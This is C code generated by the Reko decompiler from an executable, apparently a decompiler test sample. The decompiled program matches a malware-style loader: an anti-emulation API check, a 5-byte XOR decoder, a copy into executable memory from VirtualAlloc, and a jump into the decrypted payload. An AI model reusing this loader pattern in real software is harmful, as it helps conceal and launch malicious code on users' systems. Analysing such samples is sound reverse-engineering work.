// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13101000: void fn13101000(Stack Eq_2 dwArg04, Stack Eq_3 dwArg08, Stack word32 dwArg0C, Stack ptr32 dwArg10, Stack Eq_6 dwArg14, Stack ptr32 dwArg18)
void fn13101000(LPVOID dwArg04, LPVOID dwArg08, word32 dwArg0C, ptr32 dwArg10, LPVOID dwArg14, ptr32 dwArg18)
{
	*dwArg10 = dwArg0C;
	word16 wLoc0C_21 = (word16) (uint32) ((uint64) (uint32) dwArg14 % 0x05);
	byte * dwArg04_26 = dwArg04 + dwArg14;
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		*dwArg08 = (byte) ((int32) *dwArg04_26 ^ (word32) (&((&((&((&((&((&((&((&((&((&((&((&((&((&((&((&((&((&((&(dwArg18)[(int32) wLoc0C_21].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000)[0x00]);
		word16 cx_66 = wLoc0C_21 + 0x01;
		wLoc0C_21 = cx_66;
		if ((int32) cx_66 == 0x05)
			wLoc0C_21 = 0x00;
		dwArg08 = dwArg08 + 0x01;
		dwArg04_26 = dwArg04_26 + 0x01;
	}
	return;
}

// 131010A0: Register Eq_54 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	if (SafeArraySetRecordInfo(null, (IRecordInfo *) 0x00093474) == 0x80070057)
	{
		GetACP();
		word32 ecx_133 = globals->dw13102000;
		fn13101000(fp - 0x28, fp - 0x28, 0x04, fp - 0x10, null, fp - 0x0234);
		word32 ecx_153 = globals->dw13102004;
		fn13101000(fp - 0x025C, fp - 600, 0x04, fp - 0x10, (void *) 0x04, fp - 0x0234);
		ui32 ecx_175 = globals->dw13102008;
		fn13101000(fp - 0x1C, fp - 0x14, 0x04, fp - 0x10, (void *) 0x08, fp - 0x0234);
		Eq_114 eax_201 = GetModuleHandleA(null);
		word32 eax_209 = globals->dw1310200C;
		fn13101000(fp - 0x28, fp - 0x1C, 0x04, fp - 0x10, (void *) 0x0C, fp - 0x0234);
		Eq_6 dwLoc0248_242 = globals->t13102010;
		fn13101000(fp - 600, fp - 0x0248, 0x04, fp - 0x10, (void *) 0x10, fp - 0x0234);
		Eq_6 ecx_270 = ecx_175 * 0x08 + 0x0C;
		Eq_6 dwLoc0250_265 = (void *) 0x14;
		word32 * dwLoc24_268 = &globals->dw13102014;
		Eq_3 eax_283 = VirtualAlloc(null, (char *) ecx_270 + ecx_153 + ecx_133, 0x3000, 0x40);
		word32 dwLoc0C_289 = eax_209 + eax_201 + ecx_270;
		Eq_6 dwLoc0264_293 = ecx_270;
		ui32 dwLoc08_294 = 0x00;
		Eq_178 dwLoc18_295 = null;
		while (0x01 != 0x00)
		{
			if (dwLoc0264_293 == dwLoc0248_242)
			{
				ui32 edx_422 = dwLoc08_294 + 0x01;
				dwLoc08_294 = edx_422;
				if (edx_422 == ecx_175)
					break;
				word32 edx_428 = *dwLoc24_268;
				fn13101000(fp - 0x1C - dwLoc0250_265, fp - 0x1C, 0x04, fp - 0x10, dwLoc0250_265, fp - 0x0234);
				LPVOID * ecx_457 = dwLoc24_268 + 0x01;
				Eq_6 eax_454 = (char *) dwLoc0250_265 + 0x04;
				dwLoc0248_242 = (Eq_6) *ecx_457;
				fn13101000(fp - 0x0248 - eax_454, fp - 0x0248, 0x04, fp - 0x10, eax_454, fp - 0x0234);
				dwLoc0250_265 = (Eq_6) ((char *) eax_454 + 0x04);
				dwLoc24_268 = (word32 *) ((char *) ecx_457 + 0x04);
				dwLoc0264_293 = null;
				dwLoc0C_289 = (byte *) (eax_201 + edx_428 / 0x04);
			}
			Mem407[eax_283 + dwLoc18_295:byte] = Mem0[dwLoc0C_289 + 0x00:byte];
			dwLoc0C_289 = dwLoc0C_289 + 0x01;
			dwLoc18_295 = dwLoc18_295 + 0x01;
			dwLoc0264_293 = (Eq_6) ((char *) dwLoc0264_293 + 0x01);
		}
		fn13101000(eax_283 - ecx_270, eax_283, ecx_153, fp - 0x0238, ecx_270, fp - 0x0234);
		word32 esp_367;
		word32 ebp_368;
		byte SCZO_369;
		word32 eax_370;
		byte SZO_371;
		byte C_372;
		word32 ebx_373;
		word32 esi_374;
		byte Z_375;
		word32 ecx_376;
		word32 edx_377;
		byte dl_378;
		(eax_283 + 0x0F50)();
		return 0x00;
	}
	else
	{
		word32 esp_109;
		word32 ebp_110;
		byte SCZO_111;
		Eq_54 eax_112;
		byte SZO_113;
		byte C_114;
		word32 ebx_115;
		word32 esi_116;
		byte Z_117;
		word32 ecx_118;
		word32 edx_119;
		byte dl_120;
		ecx->ptr0028();
		return eax_112;
	}
}

